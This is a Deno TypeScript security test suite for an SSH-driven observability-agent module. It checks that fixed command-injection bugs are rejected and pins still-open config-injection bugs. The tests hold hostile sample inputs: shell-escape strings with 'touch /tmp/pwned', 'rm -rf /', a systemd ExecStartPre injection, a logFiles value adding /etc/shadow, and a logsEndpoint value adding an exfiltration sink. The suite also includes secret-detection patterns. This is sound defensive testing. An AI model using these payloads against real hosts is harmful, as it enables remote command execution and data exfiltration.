/**
 * Adversarial suite for @magistr/observability/agent: attacker's-perspective
 * characterization of the model's real injection surface, plus a mechanical
 * fixtures secret-scan (over the already-imported fixture objects — no
 * `--allow-read`, matching this extension's network-less/fs-less default
 * test task; see the scan's own doc comment below).
 *
 * Two HIGH remote-RCE bugs (#1, #2) and the MEDIUM bindAddress-newline
 * config injection (#4a) found during the prior test-only backfill are
 * FIXED as of this change — see CHANGELOG.md and the LOCAL
 * `observability-agent-rce` issue-lifecycle bug model (never the Lab, per
 * this repo's tracking convention). Their tests below now assert the
 * schema-boundary REJECTION of the hostile input ("fixed:" tests) plus
 * positive acceptance of legit values, rather than characterizing the
 * injection. The remaining lower-severity findings (#3, #4b-d, #5, #6) are
 * still open and remain "pin: KNOWN INJECTION"/"pin: KNOWN BUG" tests below
 * — deferred by scope, different fields or fix paths (config-integrity via
 * YAML/VRL/base64, not shell RCE).
 *
 * THE CORE TRAP THIS SUITE EXISTS TO AVOID: the real injection surface is
 * the generated REMOTE bash script fed over stdin, NOT the local `ssh` argv
 * array (Deno.Command's array-arg form never spawns a local shell, so
 * hostile sshHost/sshUser are locally safe — see the "safe:" tests below).
 * Every "pin: KNOWN INJECTION" test therefore asserts on the CAPTURED stdin
 * script (raw for install/status's inline curl calls; base64-DECODED for
 * configure's `writeRemoteFile`-written blobs), never on argv alone.
 *
 * Six bugs found during the original backfill, filed in the LOCAL
 * `observability-agent-rce` bug model:
 *   1. HIGH — FIXED. vectorVersion -> unescaped into install's curl URL ->
 *      RCE. Closed by a semver allowlist regex (`^\d+\.\d+\.\d+$`) on
 *      vectorVersion at the schema boundary, plus a `shellEsc` single-quote
 *      wrap at the curl site (defense in depth).
 *   2. HIGH — FIXED. bindAddress -> unescaped into status's curl URLs ->
 *      RCE (the nominally read-only status method was a code-exec vector).
 *      Closed by a host allowlist regex (`^[A-Za-z0-9.-]{1,253}$`) on
 *      bindAddress at the schema boundary, plus a `shellEsc` wrap at both
 *      curl sites.
 *   3. MEDIUM — bindWaitUnit newlines survive base64 into 10-boot.conf ->
 *      arbitrary systemd [Unit]/[Service] directive injection. STILL OPEN
 *      (different field, deferred).
 *   4. MEDIUM — bindAddress/hostLabel/logsEndpoint/logFiles -> exporter-flag
 *      / VRL / YAML config injection (NOT code-exec — never escapes the
 *      base64 envelope to a shell). The bindAddress-newline variant (4a) is
 *      FIXED for free by the same strict host regex as #2; hostLabel (4b),
 *      logFiles (4c) and logsEndpoint (4d) are STILL OPEN (deferred,
 *      different fix path).
 *   5. LOW — btoa() throws on non-Latin1 config content (writeRemoteFile),
 *      crashing configure with an unhandled exception instead of a clean
 *      validation error. STILL OPEN.
 *   6. LOW — doc drift (inventory undocumented) — see
 *      observability_agent_methods_test.ts's model-shape sanity test. STILL
 *      OPEN.
 *
 * nodePort/blackboxPort are `z.number().int()` — schema-constrained, and
 * therefore NOT part of the injectable surface (see the "safe:" schema
 * pin below). bindAddress and vectorVersion (both `z.string()`) are now
 * ALSO schema-constrained by the new regexes above.
 *
 * See fixtures/PROVENANCE.md for the fixture corpus's provenance and the
 * secret-scan's scope/rationale.
 */
import {
  assert,
  assertEquals,
  assertRejects,
  assertThrows,
} from "jsr:@std/assert@1";
import { model } from "./observability_agent.ts";
import installFixture from "../../fixtures/install.json" with { type: "json" };
import configureFixture from "../../fixtures/configure.json" with {
  type: "json",
};
import configureNoVectorFixture from "../../fixtures/configure-novector.json" with {
  type: "json",
};
import statusFixture from "../../fixtures/status.json" with { type: "json" };
import inventoryFixture from "../../fixtures/inventory.json" with {
  type: "json",
};
import errorFixture from "../../fixtures/error.json" with { type: "json" };

// ---------------------------------------------------------------------------
// Harness (duplicated per this repo's suite convention)
// ---------------------------------------------------------------------------

type Written = {
  spec: string;
  name: string;
  payload: Record<string, unknown>;
};

function gArgs(
  overrides: Record<string, unknown> = {},
): Record<string, unknown> {
  return model.globalArguments.parse({
    sshHost: "host.example",
    ...overrides,
  }) as Record<string, unknown>;
}

function makeCtx(globalArgOverrides: Record<string, unknown> = {}) {
  const written: Written[] = [];
  return {
    written,
    ctx: {
      globalArgs: gArgs(globalArgOverrides),
      writeResource: (spec: string, name: string, payload: unknown) => {
        written.push({
          spec,
          name,
          payload: payload as Record<string, unknown>,
        });
        return Promise.resolve({ spec, name });
      },
    },
  };
}

type MethodMap = Record<string, {
  arguments: { parse: (a: unknown) => unknown };
  execute: (a: unknown, c: unknown) => Promise<unknown>;
}>;

function run(name: string, args: Record<string, unknown>, ctx: unknown) {
  const method = (model.methods as MethodMap)[name];
  assert(method, `method ${name} must exist on the model`);
  return method.execute(method.arguments.parse(args), ctx);
}

interface CapturedCall {
  binary: string;
  args: string[];
  stdin: string;
}

interface CommandResult {
  success: boolean;
  stdout: string;
  stderr: string;
}

function encodeOutput(r: CommandResult) {
  return {
    success: r.success,
    code: r.success ? 0 : 1,
    signal: null,
    stdout: new TextEncoder().encode(r.stdout),
    stderr: new TextEncoder().encode(r.stderr),
  };
}

function withCommandStub(
  result: CommandResult,
  fn: (calls: CapturedCall[]) => Promise<void>,
): Promise<void> {
  const calls: CapturedCall[] = [];
  const original = Deno.Command;

  class FakeCommand {
    #call: CapturedCall;
    constructor(binary: string, opts: Record<string, unknown> = {}) {
      this.#call = {
        binary,
        args: (opts.args as string[] | undefined) ?? [],
        stdin: "",
      };
      calls.push(this.#call);
    }
    spawn() {
      const call = this.#call;
      return {
        stdin: {
          getWriter: () => ({
            write: (chunk: Uint8Array) => {
              call.stdin += new TextDecoder().decode(chunk);
              return Promise.resolve();
            },
            close: () => Promise.resolve(),
          }),
        },
        output: () => Promise.resolve(encodeOutput(result)),
      };
    }
    output() {
      return Promise.resolve(encodeOutput(result));
    }
  }

  (Deno as unknown as { Command: unknown }).Command = FakeCommand;
  return fn(calls).finally(() => {
    (Deno as unknown as { Command: unknown }).Command = original;
  });
}

/** Locate the `echo '<b64>' | base64 -d > '<path>'` line `writeRemoteFile`
 * emits for a given constant path inside a captured script, and return the
 * base64-decoded file content. Used by every "config lands via base64"
 * pin — the captured stdin never contains the plaintext directly. */
function extractRemoteFile(script: string, path: string): string {
  const escapedPath = path.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const re = new RegExp(
    `echo '([A-Za-z0-9+/=]+)' \\| base64 -d > '${escapedPath}'`,
  );
  const m = script.match(re);
  assert(m, `expected a base64 write to ${path} in the captured script`);
  return atob(m[1]);
}

// ---------------------------------------------------------------------------
// 1. HIGH — FIXED. vectorVersion RCE via install's curl URL
// ---------------------------------------------------------------------------

Deno.test("fixed: (HIGH, observability-agent-rce #1) — vectorVersion is validated by a semver allowlist regex at the schema boundary; a command-injection payload is rejected before install ever builds a script", () => {
  const injection = '0.46.1"; touch /tmp/pwned-install; echo "';
  assertThrows(
    () =>
      model.globalArguments.parse({
        sshHost: "host.example",
        vectorVersion: injection,
      }),
    Error,
    undefined,
    "a vectorVersion containing shell metacharacters must be rejected by " +
      "the `^\\d+\\.\\d+\\.\\d+$` allowlist regex — this closes the " +
      "install curl-URL RCE (observability-agent-rce #1) at the parse " +
      "boundary, before install's execute() ever runs",
  );
});

Deno.test("fixed: (HIGH, observability-agent-rce #1) — legit vectorVersion values (default 0.46.1, and 0.47.0) are still accepted and build the correct install curl URL", async () => {
  for (const vv of ["0.46.1", "0.47.0"]) {
    const { ctx } = makeCtx({ vectorVersion: vv });
    await withCommandStub(
      {
        success: true,
        stdout: `NODE=1.7.0\nBLACKBOX=0.25.0\nVECTOR=${vv}\n`,
        stderr: "",
      },
      async (calls) => {
        await run("install", {}, ctx);
        const script = calls[0].stdin;
        assert(
          script.includes(
            `https://packages.timber.io/vector/${vv}/vector_${vv}-1_amd64.deb`,
          ),
          `legit vectorVersion ${vv} must still build the correct .deb URL`,
        );
      },
    );
  }
});

// ---------------------------------------------------------------------------
// 2. HIGH — FIXED. bindAddress RCE via status's curl URLs (the READ-ONLY
// method)
// ---------------------------------------------------------------------------

Deno.test("fixed: (HIGH, observability-agent-rce #2) — bindAddress is validated by a host allowlist regex at the schema boundary; a command-injection payload is rejected before status ever builds a script", () => {
  const injection = '0.0.0.0"; touch /tmp/pwned-status; echo "';
  assertThrows(
    () =>
      model.globalArguments.parse({
        sshHost: "host.example",
        bindAddress: injection,
      }),
    Error,
    undefined,
    "a bindAddress containing shell metacharacters must be rejected by " +
      "the `^[A-Za-z0-9.-]{1,253}$` allowlist regex — this closes the " +
      "status curl-URL RCE (observability-agent-rce #2) at the parse " +
      "boundary, before status's execute() ever runs, making the " +
      "nominally read-only method safe again",
  );
});

Deno.test("fixed: (HIGH, observability-agent-rce #2) — legit bindAddress values (default 0.0.0.0, an RFC 5737 IPv4, and a hostname) are still accepted and build the correct status curl URLs", async () => {
  for (const ba of ["0.0.0.0", "192.0.2.10", "host.example"]) {
    const { ctx } = makeCtx({ bindAddress: ba });
    await withCommandStub(
      {
        success: true,
        stdout:
          "svc.node=active\nsvc.blackbox=active\nsvc.vector=active\nlst.node=ok\nlst.blackbox=ok\n",
        stderr: "",
      },
      async (calls) => {
        await run("status", {}, ctx);
        const script = calls[0].stdin;
        assert(
          script.includes(`http://${ba}:9100/metrics`) &&
            script.includes(`http://${ba}:9115/metrics`),
          `legit bindAddress ${ba} must still build the correct metrics URLs`,
        );
      },
    );
  }
});

// ---------------------------------------------------------------------------
// 3. MEDIUM — bindWaitUnit newline survives base64 into 10-boot.conf
// ---------------------------------------------------------------------------

Deno.test("pin: KNOWN INJECTION (MEDIUM, observability-agent-rce #3) — bindWaitUnit newline survives base64 into 10-boot.conf, injecting an arbitrary systemd directive", async () => {
  const injectedUnit =
    "wg-quick@wg0.service\nExecStartPre=/bin/touch /tmp/pwned-systemd";
  const { ctx } = makeCtx({ bindWaitUnit: injectedUnit });
  await withCommandStub(
    {
      success: true,
      stdout: "NODE=active\nBLACKBOX=active\nVECTOR=skipped\n",
      stderr: "",
    },
    async (calls) => {
      await run("configure", {}, ctx);
      const unit = extractRemoteFile(
        calls[0].stdin,
        "/etc/systemd/system/prometheus-node-exporter.service.d/10-boot.conf",
      );
      assert(
        unit.includes("ExecStartPre=/bin/touch /tmp/pwned-systemd"),
        "base64 preserves the embedded newline verbatim — the injected " +
          "directive lands as its OWN line inside the systemd drop-in, " +
          "where systemd parses and would run it as root on next unit " +
          "(re)load/start. pin: KNOWN INJECTION, not fixed here; see " +
          "observability-agent-rce.",
      );
      // The blackbox 10-boot.conf shares the same bootDropin(g) — same gap.
      const blackboxUnit = extractRemoteFile(
        calls[0].stdin,
        "/etc/systemd/system/prometheus-blackbox-exporter.service.d/10-boot.conf",
      );
      assertEquals(blackboxUnit, unit);
    },
  );
});

// ---------------------------------------------------------------------------
// 4. MEDIUM — config injection (NOT code-exec): bindAddress / hostLabel /
// logsEndpoint / logFiles corrupt exporter flags / VRL / YAML, but never
// escape the base64 envelope to a shell. 4a (bindAddress) is FIXED, folded
// into the #2 host-allowlist regex for free; 4b/4c/4d (hostLabel/logFiles/
// logsEndpoint) are STILL OPEN — deferred, different fix path (YAML/VRL-safe
// encoding).
// ---------------------------------------------------------------------------

Deno.test("fixed: (MEDIUM, observability-agent-rce #4a) — a bindAddress newline (that would have injected a second ARGS= line into the node_exporter defaults file) is rejected at the schema boundary by the same host allowlist regex that closes #2", () => {
  const injection = '0.0.0.0"\nARGS="--web.config.file=/tmp/evil';
  assertThrows(
    () =>
      model.globalArguments.parse({
        sshHost: "host.example",
        bindAddress: injection,
      }),
    Error,
    undefined,
    "a bindAddress containing a newline must be rejected by the " +
      "`^[A-Za-z0-9.-]{1,253}$` allowlist regex — the same fix that closes " +
      "#2 folds in this ARGS=-injection config-corruption bug for free " +
      "(observability-agent-rce #4a)",
  );
});

Deno.test("pin: KNOWN INJECTION (MEDIUM, observability-agent-rce #4b) — hostLabel breaks out of the VRL string literal in vector.yaml's remap transform", async () => {
  const injection = 'host.example"\n      .injected_by_hostlabel = true';
  const { ctx } = makeCtx({
    hostLabel: injection,
    logsEndpoint: "http://198.51.100.20:9428/insert/elasticsearch/",
  });
  await withCommandStub(
    {
      success: true,
      stdout: "NODE=active\nBLACKBOX=active\nVECTOR=active\n",
      stderr: "",
    },
    async (calls) => {
      await run("configure", {}, ctx);
      const yaml = extractRemoteFile(calls[0].stdin, "/etc/vector/vector.yaml");
      assert(
        yaml.includes(".injected_by_hostlabel = true"),
        "hostLabel's embedded `\"` + newline closes the VRL string literal " +
          "and injects an ARBITRARY additional VRL assignment into the " +
          "remap transform — corrupts the log-enrichment logic, never " +
          "escapes to a shell. pin: KNOWN INJECTION, not fixed here; see " +
          "observability-agent-rce.",
      );
    },
  );
});

Deno.test("pin: KNOWN INJECTION (MEDIUM, observability-agent-rce #4c) — a logFiles entry with an embedded newline injects an EXTRA tailed file path (e.g. /etc/shadow) into vector.yaml's include list", async () => {
  const injection = "/var/log/nginx/access.log\n      - /etc/shadow";
  const { ctx } = makeCtx({
    logsEndpoint: "http://198.51.100.20:9428/insert/elasticsearch/",
  });
  await withCommandStub(
    {
      success: true,
      stdout: "NODE=active\nBLACKBOX=active\nVECTOR=active\n",
      stderr: "",
    },
    async (calls) => {
      await run("configure", { logFiles: [injection] }, ctx);
      const yaml = extractRemoteFile(calls[0].stdin, "/etc/vector/vector.yaml");
      assert(
        yaml.includes("      - /etc/shadow"),
        "a single hostile logFiles STRING can inject an entirely SEPARATE " +
          "YAML sequence item — Vector would then tail and SHIP an " +
          "unintended file (e.g. /etc/shadow) to VictoriaLogs, an " +
          "unintended-disclosure flavor of this config-injection class. " +
          "pin: KNOWN INJECTION, not fixed here; see observability-agent-rce.",
      );
    },
  );
});

Deno.test("pin: KNOWN INJECTION (MEDIUM, observability-agent-rce #4d) — logsEndpoint breaks out of the YAML flow-sequence string, injecting a SECOND exfiltration sink endpoint", async () => {
  const realEndpoint = "http://198.51.100.20:9428/insert/elasticsearch/";
  const injection = `${realEndpoint}", "http://203.0.113.9/exfil`;
  const { ctx } = makeCtx({ logsEndpoint: injection });
  await withCommandStub(
    {
      success: true,
      stdout: "NODE=active\nBLACKBOX=active\nVECTOR=active\n",
      stderr: "",
    },
    async (calls) => {
      await run("configure", {}, ctx);
      const yaml = extractRemoteFile(calls[0].stdin, "/etc/vector/vector.yaml");
      assert(
        yaml.includes(`endpoints: ["${injection}"]`),
        "logsEndpoint lands verbatim inside the YAML flow-sequence string",
      );
      assert(
        yaml.includes(realEndpoint) &&
          yaml.includes("http://203.0.113.9/exfil"),
        "a hostile logsEndpoint injects a SECOND array element — Vector " +
          "would then ship every log line to an attacker-controlled " +
          "endpoint too (exfiltration), never a shell escape. pin: KNOWN " +
          "INJECTION, not fixed here; see observability-agent-rce.",
      );
    },
  );
});

// ---------------------------------------------------------------------------
// 5. LOW — btoa() throws on non-Latin1 config content
// ---------------------------------------------------------------------------

Deno.test("pin: KNOWN BUG (LOW, observability-agent-rce #5) — a non-Latin1 hostLabel crashes configure with an unhandled DOMException instead of a clean validation error", async () => {
  const { ctx, written } = makeCtx({
    logsEndpoint: "http://198.51.100.20:9428/insert/elasticsearch/",
    // U+4E3B/U+673A ("主机", Chinese for "host") — code points > 255, so
    // btoa() throws per the WHATWG Latin1-range requirement.
    hostLabel: "主机",
  });
  await withCommandStub(
    {
      success: true,
      stdout: "NODE=active\nBLACKBOX=active\nVECTOR=active\n",
      stderr: "",
    },
    async (calls) => {
      await assertRejects(
        () => run("configure", {}, ctx),
        Error,
        "Latin1",
      );
      assertEquals(
        calls.length,
        0,
        "the crash happens synchronously while BUILDING the script — " +
          "before any ssh command is ever issued",
      );
    },
  );
  assertEquals(written.length, 0, "no config resource written on the crash");
});

// ---------------------------------------------------------------------------
// SAFE side: local argv is never a shell-injection vector
// ---------------------------------------------------------------------------

Deno.test("safe: a hostile sshHost/sshUser lands as ONE local argv element each — Deno.Command's array-arg form never spawns a local shell", async () => {
  const HOSTILE_HOST = "host.example; rm -rf /";
  const HOSTILE_USER = "root; id";
  const { ctx } = makeCtx({ sshHost: HOSTILE_HOST, sshUser: HOSTILE_USER });
  await withCommandStub(
    {
      success: true,
      stdout:
        "svc.node=active\nsvc.blackbox=active\nsvc.vector=active\nlst.node=ok\nlst.blackbox=ok\n",
      stderr: "",
    },
    async (calls) => {
      await run("status", {}, ctx);
      assertEquals(calls[0].binary, "ssh");
      assertEquals(calls[0].args.length, 10, "argv shape is unchanged");
      assertEquals(calls[0].args[8], `${HOSTILE_USER}@${HOSTILE_HOST}`);
      assert(
        calls[0].args.every((a) => typeof a === "string"),
        "every argv element stays one opaque string — no local shell ever " +
          "reinterprets it (contrast with the remote-script pins above, " +
          "where the SAME kind of hostile string DOES cause a problem, " +
          "because the remote side is a real bash interpreter)",
      );
    },
  );
});

Deno.test("safe: nodePort/blackboxPort are schema-constrained (z.number().int()) — a non-numeric value is rejected before execute() ever runs", () => {
  assertThrows(() =>
    model.globalArguments.parse({
      sshHost: "host.example",
      nodePort: "9100; rm -rf /",
    })
  );
  assertThrows(() =>
    model.globalArguments.parse({
      sshHost: "host.example",
      blackboxPort: "9115\ninjected",
    })
  );
});

Deno.test("safe: writeRemoteFile's path argument is always a hardcoded module constant — no globalArg ever reaches the write-target slot", async () => {
  const KNOWN_PATHS = [
    "/etc/default/prometheus-node-exporter",
    "/etc/prometheus/blackbox.yml",
    "/etc/default/prometheus-blackbox-exporter",
    "/etc/systemd/system/prometheus-blackbox-exporter.service.d/override.conf",
    "/etc/systemd/system/prometheus-node-exporter.service.d/10-boot.conf",
    "/etc/systemd/system/prometheus-blackbox-exporter.service.d/10-boot.conf",
    "/etc/vector/vector.yaml",
    "/etc/systemd/system/vector.service.d/override.conf",
  ];
  const { ctx } = makeCtx({
    // bindAddress is now schema-validated (observability-agent-rce #2) and
    // can no longer carry shell metacharacters — use a benign value here
    // and keep testing the write-target-path invariant via the fields that
    // are still unvalidated (hostLabel/logsEndpoint/bindWaitUnit).
    bindAddress: "192.0.2.10",
    hostLabel: "label'; rm -rf / #",
    logsEndpoint: "http://198.51.100.20:9428/'; rm -rf / #",
    bindWaitUnit: "wg0'; rm -rf / #",
  });
  await withCommandStub(
    {
      success: true,
      stdout: "NODE=active\nBLACKBOX=active\nVECTOR=active\n",
      stderr: "",
    },
    async (calls) => {
      await run("configure", {}, ctx);
      const script = calls[0].stdin;
      const writeTargets = [...script.matchAll(/> '([^']*)'/g)].map((m) =>
        m[1]
      );
      assert(writeTargets.length > 0, "configure does write files");
      for (const target of writeTargets) {
        assert(
          KNOWN_PATHS.includes(target),
          `write target "${target}" must be one of the hardcoded constant paths`,
        );
      }
    },
  );
});

// ---------------------------------------------------------------------------
// Destructive-op pins — a fully successful run mutates the target host
// ---------------------------------------------------------------------------

Deno.test("pin: configure's remote script is destructive — daemon-reload, service restarts, usermod -aG adm vector, and the blackbox CAP_NET_RAW override all run on a successful call", async () => {
  const { ctx } = makeCtx({
    logsEndpoint: "http://198.51.100.20:9428/insert/elasticsearch/",
  });
  await withCommandStub(
    {
      success: true,
      stdout: "NODE=active\nBLACKBOX=active\nVECTOR=active\n",
      stderr: "",
    },
    async (calls) => {
      await run("configure", {}, ctx);
      const script = calls[0].stdin;
      assert(script.includes("systemctl daemon-reload"));
      assert(script.includes("systemctl restart prometheus-node-exporter"));
      assert(script.includes("systemctl restart prometheus-blackbox-exporter"));
      assert(script.includes("systemctl restart vector"));
      assert(script.includes("usermod -aG adm vector"));
      // AmbientCapabilities lands base64-encoded (writeRemoteFile), not literal.
      const override = extractRemoteFile(
        script,
        "/etc/systemd/system/prometheus-blackbox-exporter.service.d/override.conf",
      );
      assert(override.includes("AmbientCapabilities=CAP_NET_RAW"));
    },
  );
});

Deno.test("pin: install's remote script is destructive — apt-get install plus a dpkg fallback mutate installed packages", async () => {
  const { ctx } = makeCtx();
  await withCommandStub(
    {
      success: true,
      stdout: "NODE=1.7.0\nBLACKBOX=0.25.0\nVECTOR=0.46.1\n",
      stderr: "",
    },
    async (calls) => {
      await run("install", {}, ctx);
      const script = calls[0].stdin;
      assert(
        script.includes(
          "apt-get install -y -qq prometheus-node-exporter prometheus-blackbox-exporter",
        ),
      );
      assert(script.includes("dpkg -i"));
    },
  );
});

// ---------------------------------------------------------------------------
// Fixtures-secret-scan — mechanical backstop over the committed corpus, not
// the primary control (see fixtures/PROVENANCE.md). Scans the ALREADY-
// IMPORTED fixture objects (`with { type: "json" }`) rather than re-reading
// files from disk — the victorialogs precedent, and required here because
// this extension's default `deno task test` deliberately omits
// `--allow-read` (see deno.json / CHANGELOG.md): observability-agent does
// zero local filesystem I/O of its own (everything is over SSH), so a test
// task needing `--allow-read` just to scan its own fixtures would be a
// self-inflicted permission the model itself never needs.
// ---------------------------------------------------------------------------

const REAL_HOST_RE = /\.aopab\.art\b/i;
const RFC1918_RE =
  /\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b/;
const PEM_RE = /-----BEGIN [A-Z ]+-----/;
// Standard base64 alphabet ONLY (no "-"/"_") — deliberately excludes
// base64url and hyphen/underscore-joined identifiers, so a hyphenated
// identifier splits at every hyphen instead of forming one long,
// zero-actual-entropy "token".
const HIGH_ENTROPY_TOKEN = /^[A-Za-z0-9+/=]{32,}$/;

function tokensOf(text: string): string[] {
  return text.split(/[^A-Za-z0-9+/=]+/).filter((t) => t.length > 0);
}

/** Recursively collect every string leaf value in a parsed JSON structure. */
function collectStrings(value: unknown, out: string[] = []): string[] {
  if (typeof value === "string") {
    out.push(value);
  } else if (Array.isArray(value)) {
    for (const v of value) collectStrings(v, out);
  } else if (value !== null && typeof value === "object") {
    for (const v of Object.values(value as Record<string, unknown>)) {
      collectStrings(v, out);
    }
  }
  return out;
}

const FIXTURES: Record<string, unknown> = {
  "install.json": installFixture,
  "configure.json": configureFixture,
  "configure-novector.json": configureNoVectorFixture,
  "status.json": statusFixture,
  "inventory.json": inventoryFixture,
  "error.json": errorFixture,
};

Deno.test("fixtures-secret-scan: no string leaf in any committed fixture matches a real RFC1918 address, a real *.aopab.art host, a PEM marker, or a high-entropy token shape", () => {
  const violations: string[] = [];
  for (const [file, data] of Object.entries(FIXTURES)) {
    for (const str of collectStrings(data)) {
      if (RFC1918_RE.test(str)) {
        violations.push(`${file}: value "${str}" contains an RFC1918 address`);
      }
      if (REAL_HOST_RE.test(str)) {
        violations.push(
          `${file}: value "${str}" contains a real *.aopab.art host`,
        );
      }
      if (PEM_RE.test(str)) {
        violations.push(`${file}: value "${str}" matched a PEM block marker`);
      }
      for (const token of tokensOf(str)) {
        if (HIGH_ENTROPY_TOKEN.test(token)) {
          violations.push(
            `${file}: token "${token}" is high-entropy-shaped (32+ chars)`,
          );
        }
      }
    }
  }
  assertEquals(
    violations,
    [],
    `secret/real-name-shaped content found:\n${violations.join("\n")}`,
  );
});

Deno.test("fixtures-secret-scan: sanity — the scanner actually flags an injected real-LAN address, real host, PEM marker, and high-entropy shape (anti-vacuity)", () => {
  assert(RFC1918_RE.test("192.168.88.242"), "must flag a real-LAN-shaped IP");
  assert(
    REAL_HOST_RE.test("mk.aopab.art"),
    "must flag a real *.aopab.art host",
  );
  const poisonPem = "-----BEGIN" + " PRIVATE KEY-----";
  assert(PEM_RE.test(poisonPem), "must flag a real BEGIN marker");
  const poisonToken = "a".repeat(40);
  assert(
    HIGH_ENTROPY_TOKEN.test(poisonToken),
    "must flag a 40-char alnum blob",
  );
});
